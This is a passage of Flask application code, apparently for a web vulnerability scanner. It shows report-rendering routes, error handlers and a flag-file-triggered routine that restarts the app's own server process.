                    "vulnerabilities": scanner.vulnerabilities,
                    "system_info": scanner.system_info,
                    "exploitation_paths": scanner.exploitation_examples
                }
                
                try:
                    # Generate detailed HTML report
                    report_files = generate_vulnerability_report(report_data, report_dir, "html")
                    
                    # If detailed report was generated successfully, redirect to it
                    if "html" in report_files and os.path.exists(report_files["html"]):
                        # Fix the path issue - serve the file with a different approach
                        report_filename = os.path.basename(report_files["html"])
                        report_dir_name = os.path.basename(os.path.dirname(report_files["html"]))
                        static_subdir = f"reports/{scan_id}"
                        
                        # Ensure the directory exists in static folder
                        static_dir = os.path.join("static", static_subdir)
                        os.makedirs(static_dir, exist_ok=True)
                        
                        # Copy the report to the static directory
                        import shutil
                        static_report_path = os.path.join(static_dir, report_filename)
                        shutil.copy2(report_files["html"], static_report_path)
                        
                        # Redirect to the static file URL
                        return redirect(url_for('static', filename=f"{static_subdir}/{report_filename}"))
                except Exception as e:
                    logger.exception(f"Error generating detailed report: {str(e)}")
                    # Fall back to the standard report template
            
            # Fallback to the standard report template
            return render_template('report.html', 
                            scan_id=scan_id,
                            target_url=scanner.target_url,
                            scan_type='standard',
                            vulnerabilities=scanner.vulnerabilities,
                            system_info=scanner.system_info,
                            exploitation_examples=scanner.exploitation_examples,
                            vulnerable_components=scanner.vulnerable_components,
                            logs=scanner.scan_logs,
                            status=scanner.status)
        else:
            return render_template('error.html', message='Scan not found'), 404
    except Exception as e:
        logger.exception(f"Error generating report for scan {scan_id}: {str(e)}")
        return render_template('error.html', message=f'Error generating report: {str(e)}'), 500

@app.errorhandler(500)
def internal_error(error):
    logger.exception("Internal server error")
    return render_template('error.html', message='Internal server error'), 500

@app.errorhandler(404)
def not_found_error(error):
    return render_template('error.html', message='Page not found'), 404

@app.route('/direct_report/<scan_id>')
def direct_report(scan_id):
    """Direct access to report files, bypassing redirection issues"""
    try:
        # Check if this is a standard scan
        if scan_id in active_scans:
            scanner = active_scans[scan_id]
            return render_template('report.html', 
                            scan_id=scan_id,
                            target_url=scanner.target_url,
                            scan_type='standard',
                            vulnerabilities=scanner.vulnerabilities,
                            system_info=scanner.system_info,
                            exploitation_examples=scanner.exploitation_examples,
                            vulnerable_components=scanner.vulnerable_components,
                            logs=scanner.scan_logs,
                            status=scanner.status)
        # Check if this is an AI scan
        elif scan_id in ai_active_scans:
            scanner = ai_active_scans[scan_id]
            return render_template('report.html', 
                            scan_id=scan_id,
                            target_url=scanner.target_url,
                            scan_type='ai',
                            vulnerabilities=scanner.results.get('vulnerabilities', []),
                            system_info=scanner.results.get('system_info', {}),
                            exploitation_examples=scanner.results.get('exploitation_paths', {}),
                            ai_analysis=scanner.results.get('ai_analysis', {}),
                            remediation=scanner.results.get('remediation', {}),
                            vulnerable_components=scanner.results.get('vulnerable_components', []),
                            logs=scanner.scan_logs,
                            status=scanner.status)
        else:
            return render_template('error.html', message='Scan not found'), 404
    except Exception as e:
        logger.exception(f"Error rendering direct report for scan {scan_id}: {str(e)}")
        return render_template('error.html', message=f'Error generating report: {str(e)}'), 500

def check_for_server_restart():
    """Check if the server needs to be restarted and handle restart"""
    try:
        restart_flag_path = os.path.join("security_reports", "restart_required.flag")
        if os.path.exists(restart_flag_path):
            logger.info("Restart flag detected. Preparing to restart the server...")
            
            # Read the flag to log the reason
            with open(restart_flag_path, 'r') as f:
                restart_reason = f.read().strip()
                logger.info(f"Restart reason: {restart_reason}")
            
            # Remove the flag file to prevent repeated restarts
            os.remove(restart_flag_path)
            logger.info("Restart flag removed.")
            
            # Perform the restart based on platform
            if sys.platform.startswith('win'):
                # Windows restart
                logger.info("Initiating Windows server restart...")
                restart_script = "@echo off\ntimeout /t 5\ntaskkill /f /im python.exe /fi \"WINDOWTITLE eq VulnerabilityScanner\"\nstart \"VulnerabilityScanner\" python app.py\nexit"
                restart_script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "restart_app.bat")
                with open(restart_script_path, 'w') as f:
                    f.write(restart_script)
                    
                subprocess.Popen(restart_script_path, shell=True)
            else:
                # Unix-like restart
                logger.info("Initiating Unix-like server restart...")
                restart_script = "#!/bin/bash\nsleep 5\npkill -f 'python.*app.py'\nnohup python app.py > server.log 2>&1 &\necho 'Server restarted'\n"
                restart_script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "restart_app.sh")
                with open(restart_script_path, 'w') as f:
                    f.write(restart_script)
                    
                os.chmod(restart_script_path, 0o755)  # Make executable
                subprocess.Popen(["/bin/bash", restart_script_path])
            
            logger.info("Server restart initiated.")
    except Exception as e:
        logger.error(f"Error checking for server restart: {str(e)}")

if __name__ == '__main__':
    # Check if templates directory exists
    if not os.path.exists(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')):
        logger.error("Templates directory not found. Please ensure it exists.")
        sys.exit(1)
    
    # Set up a background thread to periodically check for restart flags
    def restart_check_thread():
        while True:
            check_for_server_restart()
            time.sleep(60)  # Check every minute
    
    # Start the restart checker thread
    threading.Thread(target=restart_check_thread, daemon=True).start()
        
    # For production, use a proper WSGI server
    if os.environ.get('FLASK_ENV') == 'production':
        app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
    else:
        app.run(debug=True) 